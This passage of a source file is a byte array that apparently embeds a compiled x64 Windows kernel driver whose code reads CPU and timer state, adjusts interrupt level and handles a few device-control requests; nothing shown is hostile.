    0x40, 0x06, 0x00, 0x00, 0x80, 0xE7, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0xE2, 0x2E, 0x72, 0x65, 0x6C, 0x6F, 0x63, 0x00, 0x00,
    0x3C, 0x01, 0x00, 0x00, 0xC0, 0xED, 0x00, 0x00, 0x40, 0x01, 0x00, 0x00, 0xC0, 0xED, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x42,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x40, 0x53, 0x48, 0x83, 0xEC, 0x10, 0xB8, 0x01, 0x00, 0x00, 0x00, 0x0F, 0xA2, 0x89, 0x04, 0x24,
    0x8B, 0xC3, 0x89, 0x4C, 0x24, 0x08, 0x48, 0xC1, 0xE8, 0x18, 0x89, 0x54, 0x24, 0x0C, 0x48, 0x83,
    0xC4, 0x10, 0x5B, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x65, 0x8A, 0x04, 0x25, 0x84, 0x01, 0x00, 0x00, 0x0F, 0xB6, 0xC0, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC,
    0x44, 0x0F, 0x20, 0xC0, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x0F, 0xB6, 0xC1, 0x44, 0x0F, 0x22, 0xC0, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x44, 0x0F, 0x20, 0xC0, 0x0F, 0xB6, 0xC9, 0x44, 0x0F, 0x22, 0xC1, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x89, 0x5C, 0x24, 0x08, 0x57, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x8B, 0x82, 0xB8, 0x00, 0x00,
    0x00, 0x48, 0x8B, 0x49, 0x40, 0x48, 0x8B, 0xFA, 0x48, 0x8B, 0x58, 0x30, 0x48, 0x8B, 0x53, 0x18,
    0xE8, 0xAB, 0x3D, 0x00, 0x00, 0x45, 0x33, 0xDB, 0x33, 0xD2, 0x4C, 0x89, 0x5B, 0x18, 0x48, 0x8B,
    0xCF, 0x4C, 0x89, 0x5F, 0x38, 0x44, 0x89, 0x5F, 0x30, 0xFF, 0x15, 0xD1, 0x84, 0x00, 0x00, 0x48,
    0x8B, 0x5C, 0x24, 0x30, 0x33, 0xC0, 0x48, 0x83, 0xC4, 0x20, 0x5F, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x89, 0x5C, 0x24, 0x08, 0x48, 0x89, 0x6C, 0x24, 0x10, 0x48, 0x89, 0x74, 0x24, 0x18, 0x57,
    0x41, 0x54, 0x41, 0x55, 0x48, 0x83, 0xEC, 0x20, 0x4C, 0x8B, 0xE9, 0x49, 0x8B, 0xC8, 0x49, 0x8B,
    0xE9, 0x49, 0x8B, 0xF0, 0x48, 0x8B, 0xDA, 0x33, 0xFF, 0xFF, 0x15, 0xA1, 0x84, 0x00, 0x00, 0x84,
    0xC0, 0x75, 0x6A, 0x44, 0x8B, 0x45, 0x18, 0x41, 0xF6, 0xC0, 0x03, 0x75, 0x60, 0x8B, 0x45, 0x10,
    0x4C, 0x8B, 0x66, 0x18, 0x83, 0xF8, 0x18, 0x72, 0x4D, 0x41, 0x3B, 0x44, 0x24, 0x08, 0x75, 0x46,
    0x41, 0x8B, 0x44, 0x24, 0x0C, 0x39, 0x45, 0x08, 0x75, 0x3C, 0x49, 0x8B, 0xC8, 0x4D, 0x8B, 0xCC,
    0x49, 0x8B, 0xD5, 0x4C, 0x8B, 0xC3, 0xE8, 0x45, 0x3D, 0x00, 0x00, 0x85, 0xC0, 0x75, 0x27, 0x41,
    0x8B, 0x54, 0x24, 0x0C, 0x8B, 0x45, 0x08, 0x8B, 0xDF, 0x3B, 0xD0, 0x8B, 0xFA, 0x76, 0x23, 0x44,
    0x8B, 0x4D, 0x18, 0x48, 0x8D, 0x0D, 0x06, 0x86, 0x00, 0x00, 0x44, 0x8B, 0xC0, 0x8B, 0xF8, 0xE8,
    0x94, 0x4B, 0x00, 0x00, 0xEB, 0x0C, 0xBB, 0x0D, 0x00, 0x00, 0xC0, 0xEB, 0x05, 0xBB, 0xBB, 0x00,
    0x00, 0xC0, 0x8B, 0xCF, 0x33, 0xD2, 0x89, 0x5E, 0x30, 0x48, 0x89, 0x4E, 0x38, 0x48, 0x8B, 0xCE,
    0xFF, 0x15, 0x0A, 0x84, 0x00, 0x00, 0x48, 0x8B, 0x6C, 0x24, 0x48, 0x48, 0x8B, 0x74, 0x24, 0x50,
    0x8B, 0xC3, 0x48, 0x8B, 0x5C, 0x24, 0x40, 0x48, 0x83, 0xC4, 0x20, 0x41, 0x5D, 0x41, 0x5C, 0x5F,
    0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x83, 0xEC, 0x28, 0x48, 0x8B, 0xCA, 0x48, 0xC7, 0x42, 0x38, 0x00, 0x00, 0x00, 0x00, 0xC7,
    0x42, 0x30, 0xBB, 0x00, 0x00, 0xC0, 0x33, 0xD2, 0xFF, 0x15, 0xC2, 0x83, 0x00, 0x00, 0xB8, 0xBB,
    0x00, 0x00, 0xC0, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0xC2, 0x00, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x32, 0xC0, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0xA1, 0x08, 0x00, 0x00, 0x00, 0x80, 0xF7, 0xFF, 0xFF, 0x48, 0x6B, 0xC0, 0x64, 0xC3, 0xCC,
    0x48, 0x89, 0x5C, 0x24, 0x08, 0x57, 0x48, 0x83, 0xEC, 0x30, 0x48, 0x8B, 0xD9, 0x48, 0x83, 0xC1,
    0x70, 0xFF, 0x15, 0xA1, 0x83, 0x00, 0x00, 0x84, 0xC0, 0x74, 0x24, 0x48, 0x8D, 0x15, 0x6E, 0x85,
    0x00, 0x00, 0x48, 0x8D, 0x4C, 0x24, 0x20, 0xFF, 0x15, 0x83, 0x83, 0x00, 0x00, 0x48, 0x8D, 0x4C,
    0x24, 0x20, 0xFF, 0x15, 0x70, 0x83, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x02, 0xFF, 0xD0, 0x48,
    0x8B, 0x7B, 0x58, 0x48, 0xC7, 0x43, 0x58, 0x00, 0x00, 0x00, 0x00, 0x48, 0x85, 0xFF, 0x74, 0x2E,
    0x48, 0x8B, 0xCF, 0xE8, 0x38, 0x22, 0x00, 0x00, 0x48, 0x8B, 0x8B, 0xF0, 0x10, 0x00, 0x00, 0x48,
    0x85, 0xC9, 0x74, 0x11, 0xFF, 0x15, 0x36, 0x83, 0x00, 0x00, 0x48, 0xC7, 0x83, 0xF0, 0x10, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8B, 0xCF, 0xFF, 0x15, 0x1A, 0x83, 0x00, 0x00, 0x48, 0x8B,
    0x5C, 0x24, 0x40, 0x48, 0x83, 0xC4, 0x30, 0x5F, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x40, 0x55, 0x57, 0x48, 0x83, 0xEC, 0x28, 0x48, 0x8B, 0x7A, 0x58, 0x48, 0x8B, 0xEA, 0x48, 0x85,
    0xFF, 0x0F, 0x84, 0xBA, 0x00, 0x00, 0x00, 0x83, 0x7F, 0x08, 0x02, 0x74, 0x1F, 0x48, 0xA1, 0x08,
    0x00, 0x00, 0x00, 0x80, 0xF7, 0xFF, 0xFF, 0x48, 0x8B, 0xCF, 0x48, 0x6B, 0xC0, 0x64, 0x48, 0x8B,
    0xD0, 0x48, 0x83, 0xC4, 0x28, 0x5F, 0x5D, 0xE9, 0xE4, 0x22, 0x00, 0x00, 0x48, 0x89, 0x5C, 0x24,
    0x40, 0x48, 0x89, 0x74, 0x24, 0x48, 0x4C, 0x89, 0x64, 0x24, 0x50, 0x4C, 0x8B, 0xA2, 0x00, 0x11,
    0x00, 0x00, 0x4C, 0x89, 0x6C, 0x24, 0x20, 0x45, 0x0F, 0x20, 0xC5, 0xB8, 0x02, 0x00, 0x00, 0x00,
    0x44, 0x0F, 0x22, 0xC0, 0x65, 0x8A, 0x04, 0x25, 0x84, 0x01, 0x00, 0x00, 0x33, 0xDB, 0x0F, 0xB6,
    0xF0, 0x3B, 0xDE, 0x74, 0x1F, 0x8B, 0xC3, 0x49, 0x0F, 0xA3, 0xC4, 0x73, 0x17, 0x48, 0xC1, 0xE0,
    0x06, 0x45, 0x33, 0xC0, 0x33, 0xD2, 0x48, 0x8D, 0x8C, 0x28, 0xF0, 0x00, 0x00, 0x00, 0xFF, 0x15,
    0x9C, 0x82, 0x00, 0x00, 0x83, 0xC3, 0x01, 0x83, 0xFB, 0x40, 0x72, 0xD5, 0x48, 0xA1, 0x08, 0x00,
    0x00, 0x00, 0x80, 0xF7, 0xFF, 0xFF, 0x48, 0x8B, 0xCF, 0x48, 0x6B, 0xC0, 0x64, 0x48, 0x8B, 0xD0,
    0xE8, 0x6B, 0x22, 0x00, 0x00, 0x45, 0x0F, 0xB6, 0xDD, 0x45, 0x0F, 0x22, 0xC3, 0x4C, 0x8B, 0x6C,
    0x24, 0x20, 0x4C, 0x8B, 0x64, 0x24, 0x50, 0x48, 0x8B, 0x74, 0x24, 0x48, 0x48, 0x8B, 0x5C, 0x24,
    0x40, 0x48, 0x83, 0xC4, 0x28, 0x5F, 0x5D, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x40, 0x53, 0x48, 0x83, 0xEC, 0x30, 0x4C, 0x8B, 0xCA, 0xB8, 0x01, 0x00, 0x00, 0x00, 0x0F, 0xA2,
    0x89, 0x44, 0x24, 0x20, 0x89, 0x4C, 0x24, 0x28, 0x89, 0x54, 0x24, 0x2C, 0x48, 0x63, 0xC3, 0x49,
    0x8B, 0xC9, 0x48, 0xC1, 0xE8, 0x18, 0x44, 0x0F, 0xB6, 0xC0, 0x48, 0xA1, 0x08, 0x00, 0x00, 0x00,
    0x80, 0xF7, 0xFF, 0xFF, 0x48, 0x6B, 0xC0, 0x64, 0x48, 0x8B, 0xD0, 0x48, 0x83, 0xC4, 0x30, 0x5B,
    0xE9, 0xEB, 0x22, 0x00, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x40, 0x53, 0x48, 0x83, 0xEC, 0x40, 0x48, 0x8B, 0xDA, 0xC7, 0x44, 0x24, 0x28, 0x10, 0x00, 0x00,
    0x00, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x00, 0x00, 0x00, 0x45, 0x33, 0xC9, 0x41, 0xB8, 0x01, 0x00,
    0x00, 0x00, 0x41, 0x0F, 0xB6, 0xD0, 0x48, 0x8B, 0x89, 0xF0, 0x10, 0x00, 0x00, 0xFF, 0x15, 0xDD,
    0x81, 0x00, 0x00, 0x48, 0x89, 0x03, 0xEB, 0x00, 0x33, 0xC0, 0x48, 0x83, 0xC4, 0x40, 0x5B, 0xC3,
    0x40, 0x53, 0x48, 0x83, 0xEC, 0x30, 0x48, 0x8B, 0xC2, 0x33, 0xDB, 0x48, 0x8B, 0x91, 0xF0, 0x10,
    0x00, 0x00, 0x48, 0x8B, 0xC8, 0xFF, 0x15, 0xBD, 0x81, 0x00, 0x00, 0xEB, 0x03, 0x83, 0xCB, 0xFF,
    0x8B, 0xC3, 0x48, 0x83, 0xC4, 0x30, 0x5B, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x44, 0x8B, 0x81, 0xF8, 0x10, 0x00, 0x00, 0x4C, 0x8D, 0x89, 0xB0, 0x00, 0x00, 0x00, 0x48, 0xC7,
    0xC2, 0xF0, 0xD8, 0xFF, 0xFF, 0x48, 0x83, 0xC1, 0x70, 0x48, 0xFF, 0x25, 0x90, 0x81, 0x00, 0x00,
    0x48, 0x83, 0xEC, 0x28, 0x48, 0x83, 0xC1, 0x70, 0xFF, 0x15, 0x5A, 0x81, 0x00, 0x00, 0x33, 0xD2,
    0x33, 0xC9, 0x48, 0x83, 0xC4, 0x28, 0x48, 0xFF, 0x25, 0x7B, 0x81, 0x00, 0x00, 0xCC, 0xCC, 0xCC,
    0x4C, 0x8B, 0x81, 0x00, 0x11, 0x00, 0x00, 0x33, 0xC0, 0x8D, 0x50, 0x40, 0x48, 0x8B, 0xC8, 0x90,
    0x49, 0x0F, 0xA3, 0xC8, 0x73, 0x03, 0x83, 0xC0, 0x01, 0x48, 0x83, 0xC1, 0x01, 0x48, 0x83, 0xEA,
    0x01, 0x75, 0xED, 0xB9, 0x01, 0x00, 0x00, 0x00, 0x85, 0xC0, 0x0F, 0x44, 0xC1, 0xC3, 0xCC, 0xCC,
    0x33, 0xC0, 0x38, 0x81, 0xFC, 0x10, 0x00, 0x00, 0x0F, 0x95, 0xC0, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC,
    0x83, 0xC1, 0x0B, 0x83, 0xF9, 0x0B, 0x77, 0x4F, 0x48, 0x8D, 0x15, 0x21, 0xF8, 0xFF, 0xFF, 0x48,
    0x63, 0xC1, 0x8B, 0x8C, 0x82, 0x30, 0x08, 0x00, 0x00, 0x48, 0x03, 0xCA, 0xFF, 0xE1, 0x33, 0xC0,
    0xC3, 0xB8, 0xBB, 0x00, 0x00, 0xC0, 0xC3, 0xB8, 0x0D, 0x00, 0x00, 0xC0, 0xC3, 0xB8, 0x58, 0x00,
    0x00, 0xC0, 0xC3, 0xB8, 0x08, 0x00, 0x00, 0xC0, 0xC3, 0xB8, 0x41, 0x01, 0x00, 0xC0, 0xC3, 0xB8,
    0x2A, 0x00, 0x00, 0xC0, 0xC3, 0xB8, 0x0E, 0x01, 0x00, 0xC0, 0xC3, 0xB8, 0x22, 0x00, 0x00, 0xC0,
    0xC3, 0xB8, 0x59, 0x00, 0x00, 0xC0, 0xC3, 0xB8, 0x01, 0x00, 0x00, 0xC0, 0xC3, 0x66, 0x66, 0x90,
    0x21, 0x08, 0x00, 0x00, 0x1B, 0x08, 0x00, 0x00, 0x15, 0x08, 0x00, 0x00, 0x27, 0x08, 0x00, 0x00,
    0x27, 0x08, 0x00, 0x00, 0x09, 0x08, 0x00, 0x00, 0x0F, 0x08, 0x00, 0x00, 0x03, 0x08, 0x00, 0x00,
    0xFD, 0x07, 0x00, 0x00, 0xF7, 0x07, 0x00, 0x00, 0xF1, 0x07, 0x00, 0x00, 0xEE, 0x07, 0x00, 0x00,
    0x48, 0x83, 0xEC, 0x38, 0x4C, 0x89, 0x4C, 0x24, 0x20, 0x44, 0x8B, 0xCA, 0x48, 0x8B, 0xD1, 0x48,
    0x8D, 0x0D, 0x62, 0x82, 0x00, 0x00, 0xE8, 0x8D, 0x47, 0x00, 0x00, 0x48, 0x83, 0xC4, 0x38, 0xC3,
    0x4D, 0x85, 0xC0, 0x4C, 0x8B, 0xC9, 0x74, 0x16, 0x0F, 0xB6, 0x02, 0x41, 0x38, 0x01, 0x75, 0x11,
    0x49, 0x83, 0xC1, 0x01, 0x48, 0x83, 0xC2, 0x01, 0x49, 0x83, 0xE8, 0x01, 0x75, 0xEA, 0x33, 0xC0,
    0xC3, 0x0F, 0xB6, 0x0A, 0x41, 0x0F, 0xB6, 0x01, 0x2B, 0xC1, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x89, 0x5C, 0x24, 0x08, 0x48, 0x89, 0x74, 0x24, 0x10, 0x57, 0x48, 0x83, 0xEC, 0x40, 0x48,
    0x8B, 0x41, 0x08, 0x48, 0x8B, 0xF1, 0x48, 0x8D, 0x15, 0x4B, 0x82, 0x00, 0x00, 0x48, 0x8B, 0x58,
    0x40, 0x48, 0x8D, 0x4C, 0x24, 0x20, 0xFF, 0x15, 0xF4, 0x7F, 0x00, 0x00, 0x48, 0x8D, 0x4C, 0x24,
    0x20, 0xFF, 0x15, 0x31, 0x80, 0x00, 0x00, 0x48, 0x8D, 0x4B, 0x70, 0xFF, 0x15, 0xE7, 0x7F, 0x00,
    0x00, 0x84, 0xC0, 0x74, 0x24, 0x48, 0x8D, 0x15, 0xB4, 0x81, 0x00, 0x00, 0x48, 0x8D, 0x4C, 0x24,
    0x30, 0xFF, 0x15, 0xC9, 0x7F, 0x00, 0x00, 0x48, 0x8D, 0x4C, 0x24, 0x30, 0xFF, 0x15, 0xB6, 0x7F,
    0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x02, 0xFF, 0xD0, 0x48, 0x8B, 0x7B, 0x58, 0x48, 0xC7, 0x43,
    0x58, 0x00, 0x00, 0x00, 0x00, 0x48, 0x85, 0xFF, 0x74, 0x2E, 0x48, 0x8B, 0xCF, 0xE8, 0x7E, 0x1E,
    0x00, 0x00, 0x48, 0x8B, 0x8B, 0xF0, 0x10, 0x00, 0x00, 0x48, 0x85, 0xC9, 0x74, 0x11, 0xFF, 0x15,
    0x7C, 0x7F, 0x00, 0x00, 0x48, 0xC7, 0x83, 0xF0, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48,
    0x8B, 0xCF, 0xFF, 0x15, 0x60, 0x7F, 0x00, 0x00, 0x48, 0x8B, 0xCB, 0xE8, 0x90, 0x07, 0x00, 0x00,
    0x48, 0x8B, 0x4E, 0x08, 0xFF, 0x15, 0xA6, 0x7F, 0x00, 0x00, 0x48, 0x8B, 0x5C, 0x24, 0x50, 0x48,
    0x8B, 0x74, 0x24, 0x58, 0x48, 0x83, 0xC4, 0x40, 0x5F, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x89, 0x6C, 0x24, 0x18, 0x57, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x8B, 0x82, 0xB8, 0x00, 0x00,
    0x00, 0x48, 0x8B, 0x49, 0x40, 0x48, 0x8B, 0xFA, 0xF6, 0x40, 0x10, 0x01, 0x48, 0x8B, 0x68, 0x30,
    0x74, 0x2A, 0xC7, 0x42, 0x30, 0x03, 0x01, 0x00, 0xC0, 0x48, 0xC7, 0x42, 0x38, 0x00, 0x00, 0x00,
    0x00, 0x48, 0x8B, 0xCF, 0x33, 0xD2, 0xFF, 0x15, 0xE4, 0x7E, 0x00, 0x00, 0xB8, 0x03, 0x01, 0x00,
    0xC0, 0x48, 0x8B, 0x6C, 0x24, 0x40, 0x48, 0x83, 0xC4, 0x20, 0x5F, 0xC3, 0x48, 0x8D, 0x54, 0x24,
    0x30, 0x48, 0x89, 0x5C, 0x24, 0x38, 0x48, 0xC7, 0x45, 0x18, 0x00, 0x00, 0x00, 0x00, 0xE8, 0x9D,
    0x07, 0x00, 0x00, 0x85, 0xC0, 0x8B, 0xD8, 0x75, 0x48, 0x48, 0x8B, 0x4C, 0x24, 0x30, 0xC7, 0x81,
    0x50, 0x06, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0x48, 0x8B, 0x4C, 0x24, 0x30, 0xC7, 0x81, 0x54,
    0x06, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xE8, 0xF4, 0x4A, 0x00, 0x00, 0x48, 0x8B, 0x4C, 0x24,
    0x30, 0x89, 0x81, 0x58, 0x06, 0x00, 0x00, 0xE8, 0xF4, 0x4A, 0x00, 0x00, 0x48, 0x8B, 0x4C, 0x24,
    0x30, 0x48, 0x89, 0x81, 0x60, 0x06, 0x00, 0x00, 0x48, 0x8B, 0x44, 0x24, 0x30, 0x48, 0x89, 0x45,
    0x18, 0x8D, 0x43, 0x0B, 0x83, 0xF8, 0x0B, 0x77, 0x58, 0x48, 0x8D, 0x15, 0xC0, 0xF5, 0xFF, 0xFF,
    0x48, 0x98, 0x8B, 0x8C, 0x82, 0xC0, 0x0A, 0x00, 0x00, 0x48, 0x03, 0xCA, 0xFF, 0xE1, 0x33, 0xDB,
    0xEB, 0x44, 0xBB, 0xBB, 0x00, 0x00, 0xC0, 0xEB, 0x3D, 0xBB, 0x0D, 0x00, 0x00, 0xC0, 0xEB, 0x36,
    0xBB, 0x58, 0x00, 0x00, 0xC0, 0xEB, 0x2F, 0xBB, 0x08, 0x00, 0x00, 0xC0, 0xEB, 0x28, 0xBB, 0x41,
    0x01, 0x00, 0xC0, 0xEB, 0x21, 0xBB, 0x2A, 0x00, 0x00, 0xC0, 0xEB, 0x1A, 0xBB, 0x0E, 0x01, 0x00,
    0xC0, 0xEB, 0x13, 0xBB, 0x22, 0x00, 0x00, 0xC0, 0xEB, 0x0C, 0xBB, 0x59, 0x00, 0x00, 0xC0, 0xEB,
    0x05, 0xBB, 0x01, 0x00, 0x00, 0xC0, 0x33, 0xD2, 0x48, 0x8B, 0xCF, 0x89, 0x5F, 0x30, 0x48, 0xC7,
    0x47, 0x38, 0x00, 0x00, 0x00, 0x00, 0xFF, 0x15, 0xF4, 0x7D, 0x00, 0x00, 0x48, 0x8B, 0x6C, 0x24,
    0x40, 0x8B, 0xC3, 0x48, 0x8B, 0x5C, 0x24, 0x38, 0x48, 0x83, 0xC4, 0x20, 0x5F, 0xC3, 0x66, 0x90,
    0x8A, 0x0A, 0x00, 0x00, 0x83, 0x0A, 0x00, 0x00, 0x7C, 0x0A, 0x00, 0x00, 0x91, 0x0A, 0x00, 0x00,
    0x91, 0x0A, 0x00, 0x00, 0x6E, 0x0A, 0x00, 0x00, 0x75, 0x0A, 0x00, 0x00, 0x67, 0x0A, 0x00, 0x00,
    0x60, 0x0A, 0x00, 0x00, 0x59, 0x0A, 0x00, 0x00, 0x52, 0x0A, 0x00, 0x00, 0x4E, 0x0A, 0x00, 0x00,
    0x48, 0x89, 0x5C, 0x24, 0x08, 0x48, 0x89, 0x54, 0x24, 0x10, 0x57, 0x48, 0x83, 0xEC, 0x20, 0x48,
    0x8B, 0xFA, 0x4C, 0x8B, 0x51, 0x40, 0x4C, 0x8B, 0x8A, 0xB8, 0x00, 0x00, 0x00, 0x49, 0x8B, 0x41,
    0x30, 0x48, 0x8B, 0x50, 0x18, 0x41, 0x8B, 0x41, 0x18, 0x3D, 0x03, 0x83, 0x22, 0x00, 0x74, 0x1B,
    0x3D, 0x07, 0x83, 0x22, 0x00, 0x74, 0x14, 0x3D, 0x0B, 0x83, 0x22, 0x00, 0x74, 0x0D, 0x4C, 0x8B,
    0xC7, 0x49, 0x8B, 0xCA, 0xE8, 0xA7, 0xF8, 0xFF, 0xFF, 0xEB, 0x4E, 0x44, 0x0F, 0x20, 0xC3, 0xB9,
    0x02, 0x00, 0x00, 0x00, 0x44, 0x0F, 0x22, 0xC1, 0x48, 0x8B, 0xC8, 0x4C, 0x8B, 0xC2, 0x49, 0x8B,
    0xD2, 0xE8, 0xAA, 0x06, 0x00, 0x00, 0x0F, 0xB6, 0xCB, 0x44, 0x0F, 0x22, 0xC1, 0x33, 0xDB, 0x89,
    0x5F, 0x30, 0x48, 0xC7, 0x47, 0x38, 0x04, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x4F, 0x70, 0x89, 0x01,
    0xEB, 0x0A, 0x8B, 0xD8, 0x48, 0x8B, 0x7C, 0x24, 0x38, 0x89, 0x47, 0x30, 0x33, 0xD2, 0x48, 0x8B,
    0xCF, 0xFF, 0x15, 0x19, 0x7D, 0x00, 0x00, 0x8B, 0xC3, 0x48, 0x8B, 0x5C, 0x24, 0x30, 0x48, 0x83,
    0xC4, 0x20, 0x5F, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x89, 0x5C, 0x24, 0x08, 0x48, 0x89, 0x6C, 0x24, 0x18, 0x48, 0x89, 0x74, 0x24, 0x20, 0x57,
    0x48, 0x83, 0xEC, 0x30, 0x48, 0x8B, 0xE9, 0x33, 0xFF, 0xC7, 0x44, 0x24, 0x48, 0xFF, 0xFF, 0xFF,
    0xFF, 0x89, 0x7C, 0x24, 0x4C, 0x48, 0x8B, 0x54, 0x24, 0x48, 0xB9, 0x00, 0x10, 0x00, 0x00, 0xFF,
    0x15, 0x8B, 0x7D, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x48, 0x8B, 0xF0, 0x0F, 0x84, 0x3D, 0x01, 0x00,
    0x00, 0x48, 0xA9, 0xFF, 0x0F, 0x00, 0x00, 0x0F, 0x85, 0x21, 0x01, 0x00, 0x00, 0x45, 0x33, 0xC9,
    0x45, 0x33, 0xC0, 0xBA, 0x00, 0x10, 0x00, 0x00, 0x48, 0x8B, 0xC8, 0x48, 0x89, 0x7C, 0x24, 0x20,
    0xFF, 0x15, 0x52, 0x7D, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x48, 0x89, 0x85, 0xF0, 0x10, 0x00, 0x00,
    0x0F, 0x84, 0xE8, 0x00, 0x00, 0x00, 0x48, 0x8B, 0xC8, 0xFF, 0x15, 0x31, 0x7D, 0x00, 0x00, 0xB2,
    0x01, 0xB9, 0x5A, 0x62, 0x02, 0x00, 0xFF, 0x15, 0xDC, 0x7C, 0x00, 0x00, 0x33, 0xD2, 0x33, 0xC9,
    0xFF, 0x15, 0xD2, 0x7C, 0x00, 0x00, 0xB9, 0x2D, 0x31, 0x01, 0x00, 0x3B, 0xC1, 0x0F, 0x43, 0xC8,
    0x33, 0xD2, 0xB8, 0x80, 0x96, 0x98, 0x00, 0xF7, 0xF1, 0x8B, 0xD8, 0xB8, 0x59, 0x17, 0xB7, 0xD1,
    0xF7, 0xE1, 0xC1, 0xEA, 0x0D, 0x89, 0x95, 0xF8, 0x10, 0x00, 0x00, 0xFF, 0x15, 0xE7, 0x7C, 0x00,
    0x00, 0x48, 0x8B, 0xCE, 0x48, 0x89, 0x85, 0x00, 0x11, 0x00, 0x00, 0xFF, 0x15, 0xCF, 0x7C, 0x00,
    0x00, 0x48, 0x8B, 0xD6, 0x4C, 0x8B, 0xC0, 0x48, 0xA1, 0x08, 0x00, 0x00, 0x00, 0x80, 0xF7, 0xFF,
    0xFF, 0x48, 0x8B, 0xCD, 0x89, 0x5C, 0x24, 0x20, 0x48, 0x6B, 0xC0, 0x64, 0x4C, 0x8B, 0xC8, 0xE8,
    0x1C, 0x33, 0x00, 0x00, 0x48, 0x8D, 0x4D, 0x70, 0x8D, 0x57, 0x01, 0xFF, 0x15, 0x97, 0x7C, 0x00,
    0x00, 0x48, 0x8D, 0x8D, 0xB0, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x01, 0xF9, 0xFF, 0xFF, 0x4C,
    0x8B, 0xC5, 0xFF, 0x15, 0x78, 0x7C, 0x00, 0x00, 0x48, 0x8D, 0x9D, 0xF0, 0x00, 0x00, 0x00, 0x90,
    0x48, 0x8D, 0x15, 0xC9, 0xF9, 0xFF, 0xFF, 0x4C, 0x8B, 0xC6, 0x48, 0x8B, 0xCB, 0xFF, 0x15, 0x5D,
    0x7C, 0x00, 0x00, 0xBA, 0x02, 0x00, 0x00, 0x00, 0x48, 0x8B, 0xCB, 0xFF, 0x15, 0x47, 0x7C, 0x00,
    0x00, 0x40, 0x0F, 0xB6, 0xD7, 0x48, 0x8B, 0xCB, 0xFF, 0x15, 0x32, 0x7C, 0x00, 0x00, 0x83, 0xC7,
    0x01, 0x48, 0x83, 0xC3, 0x40, 0x83, 0xFF, 0x40, 0x72, 0xC6, 0x33, 0xC0, 0xEB, 0x27, 0x48, 0x8B,
    0xCE, 0xBB, 0x17, 0x00, 0x00, 0xC0, 0xFF, 0x15, 0xAC, 0x7B, 0x00, 0x00, 0xEB, 0x15, 0x48, 0x8B,
    0xCE, 0xBB, 0x41, 0x01, 0x00, 0xC0, 0xFF, 0x15, 0x9C, 0x7B, 0x00, 0x00, 0xEB, 0x05, 0xBB, 0x17,
    0x00, 0x00, 0xC0, 0x8B, 0xC3, 0x48, 0x8B, 0x5C, 0x24, 0x40, 0x48, 0x8B, 0x6C, 0x24, 0x50, 0x48,
    0x8B, 0x74, 0x24, 0x58, 0x48, 0x83, 0xC4, 0x30, 0x5F, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x89, 0x5C, 0x24, 0x08, 0x48, 0x89, 0x74, 0x24, 0x10, 0x57, 0x48, 0x83, 0xEC, 0x60, 0x48,
    0x8B, 0xF1, 0x48, 0x8D, 0x15, 0xE7, 0x7D, 0x00, 0x00, 0x48, 0x8D, 0x4C, 0x24, 0x40, 0xFF, 0x15,
    0x6C, 0x7B, 0x00, 0x00, 0x4C, 0x8D, 0x9C, 0x24, 0x80, 0x00, 0x00, 0x00, 0x4C, 0x8D, 0x44, 0x24,
